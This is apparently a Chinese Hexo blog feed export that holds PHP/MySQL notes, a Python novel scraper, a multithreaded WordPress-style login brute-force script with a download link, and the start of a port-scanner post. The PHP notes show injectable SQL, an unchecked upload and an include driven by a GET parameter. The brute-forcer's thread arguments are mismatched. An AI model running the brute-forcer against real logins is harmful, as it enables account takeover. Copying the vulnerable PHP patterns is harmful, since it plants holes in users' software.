<tr>
<td align="left">a+</td>
<td align="left">以追加方式打开，游标指向文件末</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">以只写方式创建并打开，游标指向文件头。文件存在则打开失败</td>
</tr>
<tr>
<td align="left">x+</td>
<td align="left">以读写方式创建并打开，游标指向文件头。文件存在则打开失败</td>
</tr>
</tbody></table>
<p>文件读取、写入</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fgets()</td>
<td align="left">读取一行</td>
</tr>
<tr>
<td align="left">file_get_contents()</td>
<td align="left">读取全部</td>
</tr>
<tr>
<td align="left">fwrite()</td>
<td align="left">将一个字符串写入文件 ‘)?&gt;</td>
</tr>
</tbody></table>
<p>表单处理</p>
<p>超全局变量，只有在web模式下才可以使用</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$_REQUEST</td>
<td align="left">GET、POST集合，但是速度慢</td>
</tr>
<tr>
<td align="left">$_GET</td>
<td align="left">接收GET方式提交的数据，数据量小，url可见 <br>?传参，多个参数使用&amp;连接 a标签（链接）也可以使用GET方式传参</td>
</tr>
<tr>
<td align="left">$_POST</td>
<td align="left">接收POST方式提交的数据，数据量不限 需要表单提交</td>
</tr>
<tr>
<td align="left">$_FILES</td>
<td align="left">接收文件提交（暂存至临时目录） <br>移动临时文件文件至指定目录 <br>$file=$FILES[‘file’]; <br>if($file[‘error’]==0){ <br>move_uploaded_file($file[‘tmp_name’],’uploadfile/‘.$file[‘name’]); } <br>可用echo $FILES查看FILES属性，包括临时目录位置</td>
</tr>
<tr>
<td align="left">$_COOKIE</td>
<td align="left">接收cookie值 setcookie()创建cookie</td>
</tr>
<tr>
<td align="left">$_SESSION</td>
<td align="left">接收SESSION值 session_star()开启session session_id()获取session</td>
</tr>
<tr>
<td align="left">$_SERVER</td>
<td align="left">获取服务器和执行环境信息</td>
</tr>
<tr>
<td align="left">$_ENV</td>
<td align="left">接收服务器端环境变量（数组）</td>
</tr>
</tbody></table>
<p>在变量前增加@符号，可忽略简单错误</p>
<p>如：</p>
<p>echo @$_POST[‘name’];</p>
<p>其他：</p>
<p>PHP获取表单数据时，根据表单下textarea、input标签的属性来接收数据</p>
<p>会话控制</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">cookie</td>
<td align="left">保存在客户端，包含用户有关信息，有过期时间 cookie有内置数据，可直接使用 setcookie(name,value) 创建cookie <br>setcookie(name,’’,0) 销毁cookie（）设置时间为0</td>
</tr>
<tr>
<td align="left">session</td>
<td align="left">保存在服务器，cookie升级版，无过期时间，但是长时间无请求，则清除session session为空数组，需赋值使用 session_start() <br>创建session $_SESSION[‘a’]=$b; session赋值 <br>session_destroy() 销毁session（退出登录）</td>
</tr>
</tbody></table>
<p>定界符，EOF中间所有内容将按原编码存入变量</p>
<p>echo &lt;&lt;&lt;EOF</p>
<p>xxx</p>
<p>EOF;</p>
<p>文件包含</p>
<p>包含指定文件，实现代码复用</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">include()</td>
<td align="left">文件包含失败时，会产生警告，脚本会继续运行</td>
</tr>
<tr>
<td align="left">require()</td>
<td align="left">文件包含失败时，会产生错误，直接结束脚本执行</td>
</tr>
<tr>
<td align="left">include_once()</td>
<td align="left">与inlude()功能相同，文件只会被包含一次（出现多次时只生效一次）</td>
</tr>
<tr>
<td align="left">require_once()</td>
<td align="left">与require()功能相同，文件只会被包含一次</td>
</tr>
</tbody></table>
<p>用法：</p>
<p>include_once ‘header.php’;</p>
<p>include_once($GET[‘action’]);</p>
<p>若是包含变量，则可能存在文件包含漏洞</p>
<p>MYSQL数据类型（遵循sql编程规则）</p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">数值型</td>
<td align="left">int：整型 可以是十进制或十六进制 float：浮点型</td>
</tr>
<tr>
<td align="left">字符串</td>
<td align="left">CHAR：长字符串 VARCHAR：可变长字符串（常用） <br>BLOB：存储二进制数据 text：长文本信息</td>
</tr>
<tr>
<td align="left">日期和时间</td>
<td align="left">time：时间 <br>date：日期 <br>datetime：日期和时间</td>
</tr>
</tbody></table>
<p>MYSQL数据库操作</p>
<p>配置文件</p>
<table>
<thead>
<tr>
<th align="left">操作系统</th>
<th align="left">位置</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">/etc/my.conf</td>
</tr>
<tr>
<td align="left">Windows</td>
<td align="left">安装目录/my.ini</td>
</tr>
</tbody></table>
<p>常用命令</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">show databases;</td>
<td align="left">显示所有数据库</td>
</tr>
<tr>
<td align="left">use dbname;</td>
<td align="left">选定数默认数据库</td>
</tr>
<tr>
<td align="left">show tables;</td>
<td align="left">显示默认数据库中所有表</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">create database db_test;</td>
<td align="left">创建数据库</td>
</tr>
<tr>
<td align="left">use db_test;</td>
<td align="left">选定数据库</td>
</tr>
<tr>
<td align="left">create table tb_test();</td>
<td align="left">创建表 <br>CREATE TABLE tb_news( <br>id INT(10) UNSIGNED UNIQUE AUTO_INCREMENT, <br>title VARCHAR(100) NOT NULL, author VARCHAR(20) NOT NULL, <br>content TEXT NOT NULL, <br>addtime TIMESTAMP, <br>PRIMARY KEY (id) );  <br><br>CREATE TABLE tb_users( <br>id INT(10) UNSIGNED AUTO_INCREMENT, <br>uname VARCHAR(20) NOT NULL, <br>upass VARCHAR(50) NOT NULL, <br>activeSrc VARCHAR(100) DEFAULT ‘image/default.jpg’, <br>email VARCHAR(50) NOT NULL, <br>addtime TIMESTAMP, <br>PRIMARY KEY (id) ); <br>注： UNIQUE 值唯一 id属性固定（设置自增长） KEY属性固定（设定ID为主键）</td>
</tr>
<tr>
<td align="left">desc tb_test;</td>
<td align="left">查看表内容</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">insert INTO tb_test (字段) VALUE (‘内容’);</td>
<td align="left">新增字段，键值一一对应 <br>insert INTO tb_test (author,title,content) VALUES (‘zs’,’title1’,’dasdasadadadad’);</td>
</tr>
<tr>
<td align="left">select * from tb_test where xx;</td>
<td align="left">查询数据 <br>* 可替换为指定键 where限定查询范围，查询表达式运算从前往后 xx可以为：&gt;、&lt;、=、like 分别对应数值匹配和字符串匹配，like搭配%使用（%n查询以n结尾的数据） <br>select * from tb_news where content like ‘%n%’ <br>搜索content中包含n的内容 搜索范围使用and连接，标识并列，or连接表示<br><br>或者 <br>select * from tb_news where addtime &gt; ‘2021-06-23 16:48:46’ and (content like ‘%8%’ or id &lt; 16);</td>
</tr>
<tr>
<td align="left">delete</td>
<td align="left">删除 <br>delete from tb_news; <br>删除表格全部数据 <br><br>delete from tb_news where id =18; <br>最小删除单位为行 查询限制条件同select</td>
</tr>
<tr>
<td align="left">update</td>
<td align="left">修改数据 <br>update tb_news set author = ‘zs’, title = ‘hello’; <br>修改全部数据 <br><br>update tb_news set author = ‘zs’, title = ‘hello’ where id=2; <br>修改id=2的指定数据</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">alter table 表名 action</td>
<td align="left">修改表结构 action可以为： <br>add 列名 建表语句 [first|afer 列名] 为表添加一列，默认列尾添加 <br>add primary key(列名) 为表添加主键，已存在主键则报错 <br>modify 列名 &lt;建表语句&gt; [first|after 列名] 更改列类型和列名称 <br>drop 列名 删除一列 rename as 新表名 更改表名</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">\c</td>
<td align="left">放弃正在输入的命令</td>
</tr>
<tr>
<td align="left">\h</td>
<td align="left">显示命令清单</td>
</tr>
<tr>
<td align="left">\q</td>
<td align="left">退出mysql程序</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">查看mysql服务器状态</td>
</tr>
</tbody></table>
<p>补充：</p>
<p>匹配用户名密码</p>
<pre class="highlight"><span class="line">select * from tb_users where uname = &#x27;admin&#x27; and upass = &#x27;123&#x27;;</span><br></pre>

<p>注册账户</p>
<pre class="highlight"><span class="line">insert INTO tb_users (uname,upass ,email) VALUE (&#x27;admin&#x27;,&#x27;123&#x27;,&#x27;123@qq.com&#x27;);</span><br></pre>

<p>修改密码</p>
<pre class="highlight"><span class="line">update tb_users set upass = md5(&#x27;123123&#x27;) where uname=&#x27;admin&#x27;;</span><br></pre>

<p>修改表结构</p>
<pre class="highlight"><span class="line">alter table tb_users MODIFY column upass varchar(50);</span><br></pre>

<p>PHP操作MYSQL数据库</p>
<p>常用语句</p>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$db = mysqli_connect(‘127.0.0.1’,’root’,’root’);</td>
<td align="left">连接数据库软件 <br>相当于：mysql -h ‘127.0.0.1’ -uroot -proot 在被包含的配置文件中，可使用全局变量$GLOBALS[‘db’]代替$db，使得$db参数可在全局使用</td>
</tr>
<tr>
<td align="left">mysqli_select_db($GLOBALS[‘db’],’db_bbs’);</td>
<td align="left">选择数据库</td>
</tr>
<tr>
<td align="left">mysqli_set_charset($GLOBALS[‘db’],’utf8’);</td>
<td align="left">设置数据库编码格式为utf8</td>
</tr>
<tr>
<td align="left">以上三句可写入config.php文件中，使用文件包含，避免冗余代码</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">$res = mysqli_query($GLOBALS[‘db’],”SQL语句”);</td>
<td align="left">需要用变量接收，$res为资源类型数据(赋值后为对象类型)，使用$res-&gt;num_rows取数据（判断是否为空–数据库无此数据） <br><br>可在后面衔接or die(mysqli_error($GLOBALS[‘db’]));<br>显示连接错误信息</td>
</tr>
<tr>
<td align="left">$res = mysqli_query($GLOBALS[‘db’],”INSERT INTO tb_users (uname,upass,email) VALUE (‘’$uname’,’$upass’,’$email’);”);</td>
<td align="left">新增用户信息至users表 若是包含变量，则最外层需要用双引号，否则变量不生效，内层用单引号，避免截断失效</td>
</tr>
<tr>
<td align="left">$res = mysqli_query($GLOBALS[‘db’],”DELETE FROM tb_users WHERE uname=’admin’; “);</td>
<td align="left">删除admin所在行，删除限定符必须唯一</td>
</tr>
<tr>
<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;">&#49;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;</a>](mailto:<a href="mailto:&#x31;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#x31;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a>)’ WHERE uname=’admin’; “);</td>
<td align="left">修改admin密码邮箱</td>
</tr>
<tr>
<td align="left">$res = mysqli_query($GLOBALS[‘db’],”SELECT * FROM tb_users;”);</td>
<td align="left">查询全部数据，加where增加限制条件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">常用函数</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">mysqli_fetch_all($res);</td>
<td align="left">取出数据库查询到的全部数据，以索引（下标）数组存储数据</td>
</tr>
<tr>
<td align="left">mysqli_fetch_array($res);</td>
<td align="left">一次取一个结果，索引、关联类型分别存储，有两份数据</td>
</tr>
<tr>
<td align="left">mysqli_fetch_row($res);</td>
<td align="left">一次取一个结果，索引类型存储</td>
</tr>
<tr>
<td align="left">mysqli_fetch_assoc($res);</td>
<td align="left">一次取一个结果，关联类型存储，推荐使用</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">循环读取</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">while($r = mysqli_fetch_assoc($res)){ mysqli_query($GLOBALS,”SQL语句’); }</td>
<td align="left">while循环执行命令，推荐使用</td>
</tr>
<tr>
<td align="left">for($i=0; $i&lt;$res-&gt;num_rows; $i++){ mysqli_query($GLOBALS,”SQL语句”); }</td>
<td align="left">for循环执行命令，$res-&gt;num_rows为数据查询的返回条数，为0则无查询结果 <br>注意：哪怕无查询结果，返回数据也不为false，而是一个空的对象。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之网络爬虫</title>
    <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
<p>使用：</p>
<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>

<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
<p>使用</p>
<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br></pre>

<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>

<h1 id="4、下载"><a href="#4、下载" class="headerlink" title="4、下载"></a>4、下载</h1><p><a href="https://www.zerochen.top/download/Scan/pc_sg.py">https://www.zerochen.top/download/Scan/pc_sg.py</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之爆破脚本</title>
    <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
<h1 id="二、模块介绍"><a href="#二、模块介绍" class="headerlink" title="二、模块介绍"></a>二、模块介绍</h1><p><strong>参数模块</strong></p>
<p>getopt函数</p>
<pre class="highlight"><span class="line">import sys, getopt</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">   inputfile = &#x27;&#x27;</span><br><span class="line">   outputfile = &#x27;&#x27;</span><br><span class="line">   try:</span><br><span class="line">      opts, args = getopt.getopt(argv,&quot;hi:o:&quot;,[&quot;ifile=&quot;,&quot;ofile=&quot;])</span><br><span class="line">   except getopt.GetoptError:</span><br><span class="line">      print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">      sys.exit(2)</span><br><span class="line">   for opt, arg in opts:</span><br><span class="line">      if opt == &#x27;-h&#x27;:</span><br><span class="line">         print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">         sys.exit()</span><br><span class="line">      elif opt in (&quot;-i&quot;, &quot;--ifile&quot;):</span><br><span class="line">         inputfile = arg</span><br><span class="line">      elif opt in (&quot;-o&quot;, &quot;--ofile&quot;):</span><br><span class="line">         outputfile = arg</span><br><span class="line">   print (&#x27;输入的文件为：&#x27;, inputfile)</span><br><span class="line">   print (&#x27;输出的文件为：&#x27;, outputfile)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main(sys.argv[1:])</span><br><span class="line"></span><br></pre>

<p>说明：</p>
<table>
<thead>
<tr>
<th>语句</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>argv[1:]</td>
<td>不限制参数数量（&gt;1）</td>
</tr>
<tr>
<td>try:  <br>&#9;pass  <br>except  getopt.GetoptError:  <br>&#9;pass</td>
<td>异常捕捉，参数不存在时报错，提示正确的用法</td>
</tr>
<tr>
<td>opts,args=getopt.getopt(argv,”hi:o”,[“ifile=”,”ofile=”])</td>
<td>定义短标签（-）和长标签（–）  <br>短标签:表示必须有此参数，长标签=同理  <br><br>注意！经实验得知，<code>:、=</code>号使用时，只要会被用到传参的参数，都必须要加，否则会接收不到变量值。而不是说明文档中让人产生歧义的说法，让人误以为是可有可无的参数都不用加<code>:、=</code></td>
</tr>
<tr>
<td>for opt, arg in opts:     <br>&#9;if opt == ‘-h’:       <br>&#9;&#9;print (<code>&#39;test.py -i &lt;inputfile&gt;  -o &lt;outputfile&gt;&#39;</code>)       <br>&#9;&#9;sys.exit()     <br>&#9;elif opt in (“-i”,  “–ifile”):       <br>&#9;&#9;inputfile = arg</td>
<td>for循环判断匹配参数  ，opt为参数，arg为参数值</td>
</tr>
</tbody></table>
<p><strong>进度条模块</strong></p>
<p>rich</p>
<pre class="highlight"><span class="line">from rich.progress import Progress		# 模块导入</span><br><span class="line"></span><br><span class="line">with Progress() as progress:			# 模块初始化，需要嵌套在主进程函数之外，total标表示总任务数</span><br><span class="line">        task = progress.add_task(&#x27;[green]Downloading...&#x27;, total=1000)   </span><br><span class="line"> </span><br><span class="line">while not progress.finished:			# 任务函数用使用，更新进度条，advance每次更新的长度</span><br><span class="line">        progress.update(task, advance=5)</span><br><span class="line"></span><br></pre>



<p>三、代码</p>
<pre class="highlight"><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    描述：爆破脚本，用户名+密码排列组合方式，推荐精简名字典</span><br><span class="line">        支持参数、进度条、Ctrl C功能</span><br><span class="line">    version：2.0</span><br><span class="line">    author：chen</span><br><span class="line">    date：2021-08-13</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">import getopt</span><br><span class="line">import queue</span><br><span class="line">from rich.progress import Progress</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 参数处理</span><br><span class="line">def para(argv):</span><br><span class="line">    global dicts</span><br><span class="line">    dicts = &#123;&#x27;url&#x27;: &#x27;&#x27;, &#x27;thread&#x27;: &#x27;&#x27;, &#x27;delay&#x27;: &#x27;&#x27;, &#x27;file_name&#x27;: &#x27;&#x27;, &#x27;file_pass&#x27;: &#x27;&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        opts, args = getopt.getopt(argv, &quot;u:hT:&quot;, [&quot;url=&quot;, &quot;fname=&quot;, &quot;fpass=&quot;, &quot;delay=&quot;])</span><br><span class="line">    except getopt.GetoptError:</span><br><span class="line">        print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line"></span><br><span class="line">    for opt, arg in opts:</span><br><span class="line">        if opt == &#x27;-h&#x27;:</span><br><span class="line">            print(&quot;python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100&quot;)</span><br><span class="line">            exit()</span><br><span class="line">        elif opt in (&quot;-u&quot;, &quot;--url&quot;):</span><br><span class="line">            dicts[&#x27;url&#x27;] = arg</span><br><span class="line">            # print(&#x27;url:&#x27;, dicts[&#x27;url&#x27;])</span><br><span class="line">        elif opt == &#x27;-T&#x27;:</span><br><span class="line">            dicts[&#x27;thread&#x27;] = arg</span><br><span class="line">            # print(&#x27;线程:&#x27;, dicts[&#x27;thread&#x27;])</span><br><span class="line">        elif opt == &#x27;--delay&#x27;:</span><br><span class="line">            dicts[&#x27;delay&#x27;] = arg</span><br><span class="line">            # print(&#x27;发包延时:%sms&#x27; % dicts[&#x27;delay&#x27;])</span><br><span class="line">        elif opt == &#x27;--fname&#x27;:</span><br><span class="line">            dicts[&#x27;file_name&#x27;] = arg</span><br><span class="line">            # print(&#x27;用户名字典:&#x27;, dicts[&#x27;file_name&#x27;])</span><br><span class="line">        elif opt == &#x27;--fpass&#x27;:</span><br><span class="line">            dicts[&#x27;file_pass&#x27;] = arg</span><br><span class="line">            # print(&#x27;密码字典:&#x27;, dicts[&#x27;file_pass&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 初始化字典队列</span><br><span class="line">def init(fname, fpass, q):</span><br><span class="line">    # 排列组合模式生成字典队列，两个都过大时会导致初始化很慢。</span><br><span class="line">    # 建议精简用户名字典，合适的密码字典</span><br><span class="line">    print(&#x27;正在初始化字典队列...&#x27;)</span><br><span class="line">    for i in open(fname):</span><br><span class="line">        for j in open(fpass):</span><br><span class="line">            # 以列表形式写入队列</span><br><span class="line">            q.put([i.strip(), j.strip()])</span><br><span class="line">    print(&#x27;字典队列初始化完毕！&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(q, BarId, url):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        que = q.get()</span><br><span class="line"></span><br><span class="line">        # 爆破目标的核心数据包，根据实际情况更改</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;log&quot;: que[0],</span><br><span class="line">            &quot;pwd&quot;: que[1],</span><br><span class="line">            &quot;wp-submit&quot;: &quot;%E7%99%BB%E5%BD%95&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        # 代理，自定义</span><br><span class="line">        proxy = &#123;</span><br><span class="line">            &#x27;http&#x27;: &#x27;http://127.0.0.1:7890&#x27;,</span><br><span class="line">            &#x27;https&#x27;: &#x27;https://127.0.0.1:7890&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 发包，禁止302跳转，否则抓不到302返回状态码</span><br><span class="line">        # 可取消代理</span><br><span class="line">        rep = requests.post(url=url, data=data, allow_redirects=False)</span><br><span class="line">        if rep.status_code == 302:</span><br><span class="line">            print(&#x27;\033[32m爆破成功! &#123;0&#125;:&#123;1&#125;\033[0m&#x27; .format(que[0], que[1]))</span><br><span class="line">            # 爆破成功进度条拉满，触发主进程守护，结束进程</span><br><span class="line">            progress.update(BarId, advance=999999999)</span><br><span class="line">        # 更新进度条</span><br><span class="line">        progress.update(BarId, advance=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dicts = &#123;&#125;</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    # 初始化参数</span><br><span class="line">    para(sys.argv[1:])</span><br><span class="line">    # 初始化队列</span><br><span class="line">    url = dicts[&#x27;url&#x27;]</span><br><span class="line">    delay = dicts[&#x27;delay&#x27;]</span><br><span class="line">    init(dicts[&#x27;file_name&#x27;], dicts[&#x27;file_pass&#x27;], q)</span><br><span class="line"></span><br><span class="line">    # 进度条初始化</span><br><span class="line">    with Progress() as progress:</span><br><span class="line">        BarId = progress.add_task(&#x27;[green]Status:&#x27;, total=q.qsize())</span><br><span class="line">        # 多线程数量</span><br><span class="line">        for i in range(int(dicts[&#x27;thread&#x27;])):</span><br><span class="line">            # 设置主线程守护</span><br><span class="line">            t = threading.Thread(target=run, args=[q, BarId, url, delay], daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">        # 进度条结束，终止主程序运行</span><br><span class="line">        # 解决Ctrl+C终止程序 和 程序自动结束的问题</span><br><span class="line">        while not progress.finished:</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre>



<p>4、下载</p>
<p><a href="https://www.zerochen.top/download/Burst/Burst2.0.py">https://www.zerochen.top/download/Burst/Burst2.0.py</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之端口扫描</title>
    <url>/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
<p>使用</p>
<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>

